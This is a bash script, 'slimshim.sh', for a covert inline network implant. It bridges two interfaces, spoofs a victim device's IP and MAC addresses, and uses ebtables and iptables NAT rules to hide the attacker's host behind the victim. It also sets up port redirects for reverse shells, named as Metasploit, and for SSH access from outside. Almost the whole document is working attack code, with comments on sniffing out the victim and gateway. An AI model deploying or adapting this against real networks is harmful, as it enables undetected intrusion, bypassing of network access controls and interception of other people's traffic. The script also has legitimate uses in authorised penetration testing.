#!/bin/bash
# 20151213 Kirby

# Usage: slimshim.sh <ip> <mac> <routerip> <routermac> [<redir ip> <redir mac>] | prep | undo
#  
# Do not run this script until you read everything and understand it.
#  
# Run slimshim.sh prep on bootup OR pre-configure your device to bridge the interfaces and call it br-lan.  Run some sniffs on the internal interface to find the IP/MAC of your victim you want to spoof and run slimshim.sh <spoofIP> <spoofMAC>.  Then find the default gateway by restarting the inside interface and sniffing for arps.  The first arp is usually the default gateway.  Also add a route for the LAN to go out the bridge interface.
# 
# 
# This script will spoof the IP and MAC of a device attached to either interface.
# If you do not have eth0/eth1, modify this script for the outside/inside interfaces you have.
# This script will carve out ports $dynports to be used as source ports for your slimshim host.
# It will also carve out ports $rdrports to redirect to your slimshim host, for any services or reverse bind shells (e.g. Metasploit).
# It will also forward those ports for destination 1.1.1.1 so that you can connect to your slimshim host from the victim device.
# 
# Run this script as 'slimshim.sh prep' to create the bridge so that the victim can connect outbound.
# Run this script as 'slimshim.sh undo' to remove the splinter.
# 
# To discover the default gateway, look for arp requests from your victim.
# Here is an example on how to do so:
# ifconfig eth1 down; ifconfig eth1 up; tcpdump -c 10 -e -nni eth1 arp
# Usually, the first arp request after the interface returns will be to find the mac of the default gateway.

which ip >/dev/null 2>&1
if [ $? != 0 ];then
	echo "you must install the ip package"
	exit 1
fi

myip='169.254.0.1'
mymac='0:1:1:1:1:1'
sip=$1
smac=$2
rip=$3
rmac=$4
redirip=$5
redirmac=$6

# redirip and redirmac are for any other device you want to redirect to.  For example, if you are running this on a wifi router and you want to redirect to a connected wifi device.  I use this on OpenWRT to redirect to my wifi-attached laptop.

# rdrports must overlap with dynports.  Dynports are for source ports on egress connections.  Rdrports will be redirected to $myip.
dynports='27000-32000'
rdrports='25000:32000'
# $dynports needs '-' and $rdrports needs ':'.   Blame it on netfilter.

# ssh redirect from outside.  Leave blank to not redirect.  This needs to be outside the range of rdrports.
sshrdr='2501'

if [ x$redirip == 'x' ] && [ x$redirmac == 'x' ];then
	redirip=$myip
	redirmac=$mymac
fi

function clearall() {
	ebtables -t filter -F
	iptables -t filter -F
	ebtables -t nat -F
	iptables -t nat -F
	ebtables -t mangle -F
	iptables -t mangle -F
	ebtables -t raw -F
	iptables -t raw -F
	for chain in $(iptables -L -n |awk '/^Chain / {print $2}' );do 
		iptables -X $chain >/dev/null 2>&1
	done
	for chain in $(iptables -t nat -L -n |awk '/^Chain / {print $2}' );do 
		iptables -t nat -X $chain >/dev/null 2>&1
	done
	for chain in $(iptables -t raw -L -n |awk '/^Chain / {print $2}' );do 
		iptables -t raw -X $chain >/dev/null 2>&1
	done
	for chain in $(iptables -t mangle -L -n |awk '/^Chain / {print $2}' );do 
		iptables -t mangle -X $chain >/dev/null 2>&1
	done
}

function runprep() {
	brctl show br-lan 2>&1 |grep "No such device" >/dev/null 2>&1
	if [ $? == 0 ]; then
		modprobe arptable_filter >/dev/null 2>&1
		modprobe br_netfilter >/dev/null 2>&1
		brctl addbr br-lan
		brctl addif br-lan eth0
		brctl addif br-lan eth1
		ifconfig br-lan up
	fi
	ifconfig br-lan $myip netmask 255.255.255.0
	ip link set dev br-lan address $mymac
	route add default dev br-lan
	sysctl -w net.bridge.bridge-nf-call-arptables=1 >/dev/null 2>&1
	sysctl -w net.bridge.bridge-nf-call-ip6tables=1 >/dev/null 2>&1
	sysctl -w net.bridge.bridge-nf-call-iptables=1 >/dev/null 2>&1

}

if [ x$1 == 'xprep' ]; then
	clearall
	runprep
	exit 0
fi
if [ x$1 == 'xundo' ]; then
	clearall
	exit 0
fi
if [ x$2 == 'x' ]; then
	echo "Usage: $0 <ip> <mac> <routerip> <routermac> [ <redir ip> <redir mac> ] | prep | undo"
	exit 1
fi

# just to make sure we're ready
runprep

ebtables -t nat -A POSTROUTING -s $mymac ! -d $smac -j snat --to-source $smac
ebtables -t nat -A POSTROUTING -s $redirmac ! -d $smac -j snat --to-source $smac
ebtables -t nat -A POSTROUTING -s $mymac -d $smac -j snat --to-source $rmac
ebtables -t nat -A POSTROUTING -s $redirmac -d $smac -j snat --to-source $rmac
iptables -t nat -A POSTROUTING -p tcp -s $myip ! -d $sip -j SNAT --to $sip:$dynports
iptables -t nat -A POSTROUTING -p udp -s $myip ! -d $sip -j SNAT --to $sip:$dynports
iptables -t nat -A POSTROUTING -p tcp -s $myip -d $sip -j SNAT --to $rip:$dynports
iptables -t nat -A POSTROUTING -p udp -s $myip -d $sip -j SNAT --to $rip:$dynports
iptables -t nat -A POSTROUTING -p tcp -s $redirip ! -d $sip -j SNAT --to $sip:$dynports
iptables -t nat -A POSTROUTING -p udp -s $redirip ! -d $sip -j SNAT --to $sip:$dynports
iptables -t nat -A POSTROUTING -p tcp -s $redirip -d $sip -j SNAT --to $rip:$dynports
iptables -t nat -A POSTROUTING -p udp -s $redirip -d $sip -j SNAT --to $rip:$dynports
iptables -t nat -A POSTROUTING -p icmp -s $myip ! -d $sip -j SNAT --to $sip
iptables -t nat -A POSTROUTING -p icmp -s $redirip ! -d $sip -j SNAT --to $sip
iptables -t nat -A POSTROUTING -p icmp -s $myip -d $sip -j SNAT --to $rip
iptables -t nat -A POSTROUTING -p icmp -s $redirip -d $sip -j SNAT --to $rip
ebtables -t nat -A PREROUTING -p 0x800 --ip-proto tcp --ip-destination $sip --ip-destination-port=$rdrports -j dnat --to-destination $redirmac
ebtables -t nat -A PREROUTING -p 0x800 --ip-proto udp --ip-destination $sip --ip-destination-port=$rdrports -j dnat --to-destination $redirmac
ebtables -t nat -A PREROUTING -p 0x800 --ip-proto tcp --ip-destination 1.1.1.1 -j dnat --to-destination $redirmac
ebtables -t nat -A PREROUTING -p 0x800 --ip-proto udp --ip-destination 1.1.1.1 -j dnat --to-destination $redirmac
iptables -t nat -A PREROUTING ! -s $myip -d $sip -p tcp -m tcp -m multiport --dports $rdrports -j DNAT --to-destination $redirip
iptables -t nat -A PREROUTING ! -s $myip -d $sip -p udp -m udp -m multiport --dports $rdrports -j DNAT --to-destination $redirip
iptables -t nat -A PREROUTING -d 1.1.1.1 -p tcp -j DNAT --to-destination $redirip
iptables -t nat -A PREROUTING -d 1.1.1.1 -p udp -j DNAT --to-destination $redirip

if [ x$sshrdr != 'x' ];then
	ebtables -t nat -A PREROUTING -p 0x800 --ip-proto tcp --ip-destination $sip --ip-destination-port=$sshrdr -j dnat --to-destination $redirmac
	iptables -t nat -A PREROUTING -d $sip -p tcp -m tcp --dport $sshrdr -j DNAT --to-destination $redirip:22
fi

echo "Now you need to find the default router and set your default gateway"
echo "Run: ifconfig eth1 down; ifconfig eth1 up; tcpdump -c 10 -e -nni eth1 arp"
echo "You also need to add a route for the lan you are on to avoid the default gateway"
echo "Example: route add -net 192.168.1.0/24 dev br-lan"
echo "Example: route add default gw 192.168.1.1"
echo "Also, update /etc/resolv.conf"


